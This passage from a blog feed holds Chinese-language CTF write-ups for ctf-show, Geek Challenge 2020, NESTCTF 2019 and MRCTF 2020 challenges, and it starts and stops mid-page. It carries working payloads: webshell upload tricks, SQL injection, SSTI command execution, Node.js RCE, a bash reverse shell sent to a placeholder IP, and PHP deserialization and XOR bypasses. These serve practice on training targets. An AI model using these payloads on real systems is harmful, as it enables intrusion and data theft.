class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行第一次渲染的图片：1.jpg </p>
<p><code>php jpg_payload.php 1.jpg</code>进行二次修改</p>
<p>然后上传就可以看到需要的代码被写进去</p>
<h3 id="web-166"><a href="#web-166" class="headerlink" title="web 166"></a>web 166</h3><p>只能上传zip格式，不仅前端后端也有过滤，所以只能上传zip格式，将zip用文本格式打开，在里面添加我们的一句话木马，这样就可以直接运行一句话木马</p>
<h3 id="web-167"><a href="#web-167" class="headerlink" title="web 167"></a>web 167</h3><p>有个提示：httpd</p>
<p>以为意味这我们可以通过.htaccess文件修改主配置文件,我们直接修改，因为他只能上传jpg文件所以我们让他将jpg文件用php语言执行，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>

<p>需要抓包修改文件类型上传，需要修改成jpeg文件上传</p>
<h3 id="web-168"><a href="#web-168" class="headerlink" title="web 168"></a>web 168</h3><p>基础免杀，上传了png文件抓包可以修改后缀上传，可以发现上传成功，访问也可以正确回显，我们在其中插入phpinfo可以执行</p>
<p>但是如果是eval还有system就会显示null，那么就用反引号还有=号构造系统命令上传，可以执行</p>
<h3 id="web-169"><a href="#web-169" class="headerlink" title="web 169"></a>web 169</h3><p>发现文件页面的检查是zip文件，上传之后发现只有png文件可以上传，然后还过滤了<code>&lt;</code>那么构造php文件的方式就没办法了，但是他是可以新建文件的，如果我们上传文件1.php内容为123她会自动新建一个页面，那么我们在upload文件夹新建一个index.php文件然后用user.ini文件修改配置让他包含日志文件，这样的话我们直接在User-Agent头写入一句话木马，然后在这个页面执行就行</p>
<h3 id="web-170"><a href="#web-170" class="headerlink" title="web 170"></a>web 170</h3><p>同上，但是nl还有tac命令用的时候不知道出现了什么问题（太菜了没找到），最后用cat也能拿到flag就是了</p>
<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="web-171"><a href="#web-171" class="headerlink" title="web 171"></a>web 171</h3><p>没有任何过滤那应该在这张表里面，直接用</p>
<p><code>1&#39;or&#39;1&#39;=&#39;1</code>即可拿到表单的所有信息</p>
<p>（也可以直接查询）</p>
<h3 id="web-172"><a href="#web-172" class="headerlink" title="web 172"></a>web 172</h3><p>添加了限制条件，上面的不能用了，还是单引号闭合，直接联合查询</p>
<p>最终payload：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-1&#x27;union select 1,(select password from ctfshow_user2 where username = flag);--+</span><br><span class="line">或者直接爆他所有的内容。</span><br><span class="line">-1&#x27;union select 1,group_concat(&#x27;~&#x27;,username,&#x27;:&#x27;,password) from ctfshow_user2;--+</span><br></pre></td></tr></table></figure>

<h3 id="web-173"><a href="#web-173" class="headerlink" title="web 173"></a>web 173</h3><p>对username进一步过滤，flag不能出现，那么我们直接爆出password所有内容就行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-1&#x27;union select 1,2,(select group_concat(&#x27;~&#x27;,password) from ctfshow_user3);--+</span><br></pre></td></tr></table></figure>

<h3 id="web-174"><a href="#web-174" class="headerlink" title="web 174"></a>web 174</h3><p>这里不仅过滤了flag还跟着过滤掉了数字，可以再查询出结果之前对他进行替换</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1&#x27; union select REPLACE(username,&#x27;g&#x27;,&#x27;j&#x27;),REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(password,&#x27;0&#x27;,&#x27;numa&#x27;),&#x27;1&#x27;,&#x27;numb&#x27;),&#x27;2&#x27;,&#x27;numc&#x27;),&#x27;3&#x27;,&#x27;numd&#x27;),&#x27;4&#x27;,&#x27;nume&#x27;),&#x27;5&#x27;,&#x27;numf&#x27;),&#x27;6&#x27;,&#x27;numg&#x27;),&#x27;7&#x27;,&#x27;numh&#x27;),&#x27;8&#x27;,&#x27;numi&#x27;),&#x27;9&#x27;,&#x27;numj&#x27;),&#x27;g&#x27;,&#x27;xiaolong&#x27;) from ctfshow_user4;--+</span><br></pre></td></tr></table></figure>

<p>拿到flag之后对他进行还原即可</p>
<h3 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h3><p>应该是要用到时间盲注,但是有点费时间还可以直接写入文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(password) from ctfshow_user5 into outfile &#x27;/var/www/html/1.txt&#x27;%23</span><br></pre></td></tr></table></figure>

<p>然后访问网址即可</p>
<h3 id="web-176（过滤注入）"><a href="#web-176（过滤注入）" class="headerlink" title="web 176（过滤注入）"></a>web 176（过滤注入）</h3><p>emmmm似乎是没有什么过滤<code>1&#39;or&#39;1&#39;=&#39;1</code></p>
<h3 id="web-177"><a href="#web-177" class="headerlink" title="web 177"></a>web 177</h3><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><h3 id="web-361"><a href="#web-361" class="headerlink" title="web 361"></a>web 361</h3><p>这里跳了一下，看一下模板，ssti</p>
<p>题目的提示：名字就是提示，我们只需要在网页的后面以get方式传入一个值就行了</p>
<p>既然是ssti那么我们直接测试一下49看一下</p>
<p>如果返回的是7777777那么就是jinjia2</p>
<p>如果返回的是49那么就是twig</p>
<p>成功返回了49，那就肯定了就是这里。</p>
<p>那么我们直接开始调用里面的魔术方法</p>
<p><code>&#39;&#39;.__class__.__mro__</code>可以看到object类在2那么数组就是1，然后我们进去看一看它里面的类</p>
<p><code>&#39;&#39;.__class__.__mro__[1].__subclasses__()</code>可以看到回显了很多类，我们查找可以执行os命令的类</p>
<p>找到了在133，那么数组就是132我们直接调用初始化，然后globals全局来查找可以使用的方法及变量参数</p>
<p>这里面os是空的，继续找，找到popen</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <tags>
        <tag>ctf-show</tag>
      </tags>
  </entry>
  <entry>
    <title>ctf-show2</title>
    <url>/2022/03/30/ctf-show2/</url>
    <content><![CDATA[<h1 id="ctf-show-第二篇"><a href="#ctf-show-第二篇" class="headerlink" title="ctf-show 第二篇"></a>ctf-show 第二篇</h1><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h2 id="web-253"><a href="#web-253" class="headerlink" title="web 253"></a>web 253</h2><p>拿到flag需要判断账号密码，只需要跟题目里面相同即可</p>
<h3 id="web-254"><a href="#web-254" class="headerlink" title="web 254"></a>web 254</h3><h3 id="web-255"><a href="#web-255" class="headerlink" title="web 255"></a>web 255</h3><p>需要在cookie中设置user属性，属性是将ctfshowuser序列化之后修改isvip值为1的序列化</p>
<h3 id="web-256"><a href="#web-256" class="headerlink" title="web 256"></a>web 256</h3><p>跟上面的不同，需要账号密码不同才能够登录，我们直接在cookie里面构造的序列化中构造不一样的账号密码登录即可</p>
<h3 id="web-257"><a href="#web-257" class="headerlink" title="web 257"></a>web 257</h3><p>因为在ctfshowuser类中的构造方法指定了新构造的链子，我们需要改另一个链子作为下一个目标，所以可以直接修改构造函数里面的值来更改他的链子拿到flag</p>
<h3 id="web-258"><a href="#web-258" class="headerlink" title="web 258"></a>web 258</h3><p>对cookie多了一层过滤，<code>O:</code>还有<code>C:</code>后面不能有数字，我们可以在编码之前加上一个加号，这样编码回去的时候加号会被解析回来</p>
<h3 id="web-259"><a href="#web-259" class="headerlink" title="web 259"></a>web 259</h3><h2 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h2><h3 id="web-334"><a href="#web-334" class="headerlink" title="web 334"></a>web 334</h3><p>直接下载源码，判断条件是账号密码正确</p>
<p>给出了账号密码：CTFSHOW  123456</p>
<p>账号会经过一层过滤，将小写转换成大写，直接输入ctfshow  123456登录即可</p>
<h3 id="web-335"><a href="#web-335" class="headerlink" title="web 335"></a>web 335</h3><p>查看源码发现<code>/?eval=</code></p>
<p>猜测是一条nodejs RCE</p>
<p>直接注入：<code>require(&quot;child_process&quot;).execSync(&#39;ls /&#39;);</code></p>
<h3 id="web-336"><a href="#web-336" class="headerlink" title="web 336"></a>web 336</h3><p>一层小小的过滤，将上面的execSync用拼接的方式拼接即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">require(&quot;child_process&quot;)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure>

<h3 id="web-337"><a href="#web-337" class="headerlink" title="web 337"></a>web 337</h3><p>数组绕过</p>
<p><code>a[x]=1&amp;b[x]=2</code></p>
<h3 id="web-338"><a href="#web-338" class="headerlink" title="web 338"></a>web 338</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var express = require(&#x27;express&#x27;);</span><br><span class="line">var router = express.Router();</span><br><span class="line">var utils = require(&#x27;../utils/common&#x27;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* GET home page.  */</span><br><span class="line">router.post(&#x27;/&#x27;, require(&#x27;body-parser&#x27;).json(),function(req, res, next) &#123;</span><br><span class="line">  res.type(&#x27;html&#x27;);</span><br><span class="line">  var flag=&#x27;flag_here&#x27;;</span><br><span class="line">  var secert = &#123;&#125;;</span><br><span class="line">  var sess = req.session;</span><br><span class="line">  let user = &#123;&#125;;</span><br><span class="line">  utils.copy(user,req.body);</span><br><span class="line">  if(secert.ctfshow===&#x27;36dboy&#x27;)&#123;</span><br><span class="line">    res.end(flag);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    return res.json(&#123;ret_code: 2, ret_msg: &#x27;登录失败&#x27;+JSON.stringify(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">module.exports = router;</span><br></pre></td></tr></table></figure>

<p>主要的点在这里：</p>
<p><code>  utils.copy(user,req.body);</code></p>
<p>他没有限制我们的输入，而secret跟user都是空</p>
<p>那么我们在输入的时候直接让<code>user.__proto__=&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;</code>即可</p>
<h3 id="web-339"><a href="#web-339" class="headerlink" title="web 339"></a>web 339</h3><p>他将判断条件改成了<code>secret.ctfshow===flag</code></p>
<p>但是flag是变量，所以不行</p>
<p>发现比上一条题目多了一个文件，看了下这个query是没有定义的，我们可以在上面对他的父类属性进行覆盖，然后里面填入我们要执行的语句反弹一个shell就行</p>
<p>​    ~~~</p>
<p>{“<strong>proto</strong>“:{“query”:”return global.process.mainModule.constructor._load(‘child_process’).exec(‘bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip地址/端口 0&gt;&amp;1&quot;‘)”}}</p>
]]></content>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>jikedatiaozhan2020-greatphp</title>
    <url>/2022/03/31/jikedatiaozhan2020-greatphp/</url>
    <content><![CDATA[<h2 id="极客大挑战-2020-Greatphp"><a href="#极客大挑战-2020-Greatphp" class="headerlink" title="[极客大挑战 2020]Greatphp"></a>[极客大挑战 2020]Greatphp</h2><p>因为看到了原生类反序列化，看到这条，就来做一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="keyword">$this</span>-&gt;syc != <span class="keyword">$this</span>-&gt;lover) &amp;&amp; (md5(<span class="keyword">$this</span>-&gt;syc) === md5(<span class="keyword">$this</span>-&gt;lover)) &amp;&amp; (sha1(<span class="keyword">$this</span>-&gt;syc)=== sha1(<span class="keyword">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">           <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="keyword">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">               <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;syc);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]))&#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>提供了一个反序列化的点，只提供了一个类，需要绕过wakeup魔术方法中的条件，md5以及sha1的绕过在一般情况下是可以直接用数组进行绕过的，但是这里是类，没办法使用，这里就需要提到一个php的原生类：error或者exception，在这两个原生类中内置了__toString魔术方法，当他被调用的时候会自动报错从而将异常或者错误转换成字符串。</p>
<p>简单说明一下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Error</span>: payload in D:\php\phpError.php:<span class="number">2</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br></pre></td></tr></table></figure>

<p>这里会输出当前的报错信息”payload”，以及当前的行号，但是我们输入的错误代码斌没有被回显，这样的话就提供了我们构造判断的条件</p>
<p>我们可以令他回显不出来的地方不同来绕过判断，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> SYCLOVER();</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;syc = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;lover = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$c</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这样即可绕过判断，进入下面，我们需要拿到flag的话只需要修改payload中的内容即可</p>
<p>看一下过滤：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php    (     )     &quot;     &#x27;</span><br></pre></td></tr></table></figure>

<p>绕过的话可以尝试一下取反绕过，因为括号被过滤了无法调用函数，可以构造include“文件名字符串”的形式来，构造中间的数，因为取反结束之后include后面就是字符串了，不需要用单双引号来包裹。最后flag是在根目录下（多测一下就好了）</p>
<p>payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.urldecode(<span class="string">&#x27;%D0%99%93%9E%98&#x27;</span>).<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> SYCLOVER();</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">1</span>);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;syc = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;lover = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$c</span>));</span><br></pre></td></tr></table></figure>

<p>注意这里写入的执行文件需要提前用<code>?&gt;</code>来闭合前面的报错内容，这样的话就可以执行后面的包含内容了</p>
]]></content>
      <tags>
        <tag>极客大挑战2020</tag>
      </tags>
  </entry>
  <entry>
    <title>lovematch2</title>
    <url>/2022/03/29/lovemath2/</url>
    <content><![CDATA[<h2 id="NESTCTF-2019-Love-Math-2"><a href="#NESTCTF-2019-Love-Math-2" class="headerlink" title="[NESTCTF 2019]Love Math 2"></a>[NESTCTF 2019]Love Math 2</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= <span class="number">60</span>) &#123;<span class="comment">#长度不能超过60</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span> , <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">过滤的字符：   space \t \r \n &#x27; &quot; ` [   ]</span><br></pre></td></tr></table></figure>

<p>可以看到异或还有取反是没有被过滤的或许可以利用</p>
<p>我们可以利用的函数也给出了名单，跟上次做的不一样没有base_convert也就是不能任意转换进制了，所以得想想其他办法：学到了一个新姿势，原来异或可以这样用。</p>
<p>我们知道以上这些函数在php中不仅能代表函数，还可以被当作变量来使用，那么我们就可以利用这点来构造出另一个一句话，也就是需要我们构造出这样一种形式：<code>$_GET&#123;变量&#125;($_GET&#123;变量&#125;)</code>这样就可以构造出可以执行语句的get传参，变量好解决，那么我们怎么构造前面的<code>_GET</code>呢，我们知道异或可以构造出不一样的参数，我们可以用一个两位数来与上面的白名单中的函数进行异或，这样他异或之后的字符也许可能拼凑 出我们需要的<code>_GET</code>简单写一个fuzz用数字与上面的函数进行拼凑。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload：?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0=assert&amp;1=system(&quot;cat /flag&quot;);#_G  ET</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>NESTCTF2019</tag>
      </tags>
  </entry>
  <entry>
    <title>套娃</title>
    <url>/2022/03/31/%E5%A5%97%E5%A8%83/</url>
    <content><![CDATA[<h2 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h2><p>进入页面没什么东西，图片都没加载，打开源码看看有没有提示</p>
<p>发现一部分源代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];<span class="comment">#query string（查询字符串），如果有的话，通过它进行页面访问。</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( substr_count(<span class="variable">$query</span>, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || substr_count(<span class="variable">$query</span>, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;<span class="comment">#substr_count计算字串出现的次数下划线(url编码也算)出现的次数部位令</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="string">&#x27;/^23333$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;<span class="comment">#23333</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>其实还是比较好绕过的，第一个判断就是变量里面不能有下划线，考到一个php特性：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当变量里面含有 [ space . + 这四个字符的时候，他们会自动转换成下划线</span><br><span class="line">(当[在前面的时候，后面跟着的其他三个字符是不会变化的)</span><br></pre></td></tr></table></figure>

<p>直接用三个点绕过下划线</p>
<p>进入第二个if</p>
<p>正则匹配，需要开头是23333字符，但是前面又不能是23333，这里考到正则的一个特性，正则中$符号匹配的不是字符串的末尾，其实后面还可以有换行符</p>
<p>所以我们直接在后面添加一个%0a换行符，直接可以拿到下一关的提示：<code>FLAG is in secrettw.php</code></p>
<p>果然是套娃，还有另一关。</p>
<p>说ip不对，其他没什么，打开源码发现一大堆奇怪的字符（fuckjs）</p>
<p>直接拿去console控制台粘贴一下，就可以被编译</p>
<p>跳出一个弹框<code>post me Merak</code></p>
<p>以post方式传入Merak发现源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Flag is here~But how to get it? <span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = base64_decode(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= chr ( ord (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = getIp();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.change(<span class="variable">$_GET</span>[<span 